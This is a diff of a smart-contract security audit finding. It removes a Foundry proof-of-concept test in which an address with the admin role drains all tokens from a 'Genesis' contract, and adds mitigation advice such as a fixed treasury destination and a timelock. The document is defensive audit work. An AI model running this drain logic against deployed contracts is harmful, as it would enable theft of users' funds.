@@ -43,81 +43,30 @@ Impact
 
 -Severity: High, due to direct financial loss and systemic impact.
 
-Proof of Concept (PoC)
 
-The following Foundry test demonstrates the exploit:
+## Recommended Mitigation
+1. **Restrict Withdrawal Destination**: Limit the `to` address to a predefined treasury or multisig wallet:
+   ```solidity
+   address public immutable treasury;
+   constructor(address _treasury) {
+       treasury = _treasury;
+   }
+   function withdrawLeftAssetsAfterFinalized(address to, address token, uint256 amount) external onlyRole(DEFAULT_ADMIN_ROLE) {
+       require(to == treasury, "Invalid destination");
+       // ... rest of function
+   }
+   ```
 
-```solidity
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.26;
+   2. **Add Validation**: Ensure withdrawals only occur for truly leftover assets (e.g., after all refunds and distributions).
+3. **Implement Timelock**: Use a timelock for withdrawals to allow community oversight:
+   ```solidity
+   import "@openzeppelin/contracts/governance/TimelockController.sol";
+   ```
 
-import "forge-std/Test.sol";
-import "../Genesis.sol";
-import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+   
+## Tools Used
+- Manual code review
 
-contract MockVirtualToken is ERC20 {
-    constructor() ERC20("VirtualToken", "VT") {}
-    function mint(address to, uint256 amount) external { _mint(to, amount); }
-}
-
-contract GenesisTest is Test {
-    Genesis genesis;
-    MockVirtualToken virtualToken;
-    address attacker = address(0xdead);
-    address factory = address(0x1);
-    address participant = address(0x2);
-
-    function setUp() public {
-        virtualToken = new MockVirtualToken();
-        genesis = new Genesis();
-        GenesisInitParams memory params = GenesisInitParams({
-            genesisID: 1,
-            factory: factory,
-            startTime: block.timestamp + 1 days,
-            endTime: block.timestamp + 2 days,
-            genesisName: "Test Genesis",
-            genesisTicker: "TGEN",
-            genesisCores: new uint8[](1),
-            tbaSalt: bytes32(0),
-            tbaImplementation: address(0x3),
-            daoVotingPeriod: 1 days,
-            daoThreshold: 100,
-            agentFactoryAddress: address(0x4),
-            virtualTokenAddress: address(virtualToken),
-            reserveAmount: 1000e18,
-            maxContributionVirtualAmount: 100e18,
-            agentTokenTotalSupply: 1000e18,
-            agentTokenLpSupply: 500e18
-        });
-        vm.prank(factory);
-        genesis.initialize(params);
-
-        // Grant DEFAULT_ADMIN_ROLE to attacker
-        vm.prank(factory);
-        genesis.grantRole(genesis.DEFAULT_ADMIN_ROLE(), attacker);
-
-        // Simulate participant contribution
-        virtualToken.mint(participant, 100e18);
-        vm.prank(participant);
-        virtualToken.approve(address(genesis), 100e18);
-        vm.prank(participant);
-        genesis.participate(50, 100e18);
-    }
-
-    function testWithdrawAssets() public {
-        // Fast forward to after endTime
-        vm.warp(block.timestamp + 3 days);
-
-        // Attacker withdraws all virtualToken
-        uint256 contractBalance = virtualToken.balanceOf(address(genesis));
-        vm.prank(attacker);
-        genesis.withdrawLeftAssetsAfterFinalized(attacker, address(virtualToken), contractBalance);
-
-        assertEq(virtualToken.balanceOf(attacker), contractBalance, "Attacker withdrew tokens");
-        assertEq(virtualToken.balanceOf(address(genesis)), 0, "Contract drained");
-    }
-}
-```
-Execution: Run `forge test --match-path test/GenesisTest.sol`. The test shows an attacker with `DEFAULT_ADMIN_ROLE` draining all virtualToken from the contract.
-
-import "../genesis/Genesis.sol";
+## References
+- [OpenZeppelin AccessControl Documentation](https://docs.openzeppelin.com/contracts/4.x/access-control)
+- [Solidity Documentation on Access Control](https://docs.soliditylang.org/en/v0.8.26/control-structures.html)
